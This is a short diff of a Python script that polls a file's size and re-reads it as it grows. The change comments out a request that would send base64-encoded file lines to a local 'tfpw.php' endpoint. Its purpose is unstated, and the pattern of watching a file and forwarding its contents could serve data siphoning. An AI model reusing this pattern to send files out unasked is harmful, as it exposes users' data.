@@ -11,7 +11,7 @@ r = requests.get('http://127.0.0.1:8080/ping.php')
 oldsize=-1
 while True:
     size = os.path.getsize(fn)
-    r = requests.get('http://127.0.0.1:8080/tfpw.php?data=' + str(base64.b64encode(line)))
+    #r = requests.get('http://127.0.0.1:8080/tfpw.php?data=' + str(base64.b64encode(line)))
     if size!=oldsize:
         with open(fn, "r") as f:
             if size>oldsize:
